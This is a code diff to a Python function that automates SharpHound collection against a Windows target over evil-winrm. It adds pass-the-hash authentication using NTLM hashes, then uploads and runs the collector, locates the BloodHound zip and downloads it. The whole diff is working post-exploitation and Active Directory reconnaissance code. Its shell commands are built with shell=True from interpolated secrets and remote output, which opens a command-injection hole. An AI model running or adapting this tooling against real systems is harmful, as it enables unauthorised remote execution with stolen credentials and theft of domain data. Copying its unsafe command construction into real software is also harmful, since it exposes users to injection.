@@ -34,6 +34,10 @@ from core.paths import get_tool_path, get_chain_artifacts_dir
 
 
 def run_sharphound(data, cred, args):
+    import re
+    import subprocess
+    from pathlib import Path
+
     ip = data["ip"]
     target = data["name"]
 
@@ -41,12 +45,21 @@ def run_sharphound(data, cred, args):
     secret = cred.get("secret")
     cred_type = cred.get("type")
 
-    if cred_type != "password":
-        print("[!] sharphound requires password auth")
-        return data
-
     if not user or not secret:
         print("[!] Missing valid credentials")
+        return data
+
+    # -------------------
+    # Auth Builder
+    # -------------------
+    if cred_type == "password":
+        auth = f"-u {user} -p '{secret}'"
+
+    elif cred_type in ("ntlm", "hash"):
+        auth = f"-u {user} -H {secret}"
+
+    else:
+        print(f"[!] Unsupported auth type: {cred_type}")
         return data
 
     # -------------------
@@ -60,8 +73,6 @@ def run_sharphound(data, cred, args):
         print(f"[!] SharpHound not found: {local_path}")
         return data
 
-    from pathlib import Path
-    
     out_dir = Path(getattr(args, "out", None) or ".").expanduser().resolve()
     out_dir.mkdir(parents=True, exist_ok=True)
 
@@ -70,7 +81,7 @@ def run_sharphound(data, cred, args):
     # -------------------
     upload_cmd = (
         f'echo "upload {local_path}" | '
-        f'evil-winrm -i {ip} -u {user} -p {secret}'
+        f'evil-winrm -i {ip} {auth}'
     )
 
     print("[*] Uploading SharpHound...")
@@ -80,8 +91,9 @@ def run_sharphound(data, cred, args):
     # 2. Execute
     # -------------------
     exec_cmd = (
-        f'echo ".\\{filename} -c All --outputdirectory . --outputprefix {prefix}" | '
-        f'evil-winrm -i {ip} -u {user} -p {secret}'
+        f'echo ".\\{filename} -c All --outputdirectory . '
+        f'--outputprefix {prefix}" | '
+        f'evil-winrm -i {ip} {auth}'
     )
 
     print("[*] Running SharpHound...")
@@ -94,14 +106,24 @@ def run_sharphound(data, cred, args):
     # -------------------
     list_cmd = (
         f'echo "dir {prefix}*.zip" | '
-        f'evil-winrm -i {ip} -u {user} -p {secret}'
+        f'evil-winrm -i {ip} {auth}'
     )
 
     print("[*] Locating output zip...")
-    result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True)
+    result = subprocess.run(
+        list_cmd,
+        shell=True,
+        capture_output=True,
+        text=True
+    )
 
-    output = result.stdout
-    matches = re.findall(rf"({prefix}.*?\.zip)", output, re.IGNORECASE)
+    output = result.stdout + result.stderr
+
+    matches = re.findall(
+        rf"({prefix}.*?\.zip)",
+        output,
+        re.IGNORECASE
+    )
 
     if not matches:
         print("[!] No BloodHound zip found")
@@ -110,17 +132,21 @@ def run_sharphound(data, cred, args):
     zipname = matches[-1]
     print(f"[+] Found zip: {zipname}")
 
-   # -------------------
+    # -------------------
     # 4. Download
     # -------------------
     download_cmd = (
         f'echo "download {zipname}" | '
-        f'evil-winrm -i {ip} -u {user} -p {secret}'
+        f'evil-winrm -i {ip} {auth}'
     )
 
     print(f"[*] Downloading {zipname}...")
 
-    subprocess.run(download_cmd, shell=True, cwd=out_dir)
+    subprocess.run(
+        download_cmd,
+        shell=True,
+        cwd=out_dir
+    )
 
     # -------------------
     # 5. Verify
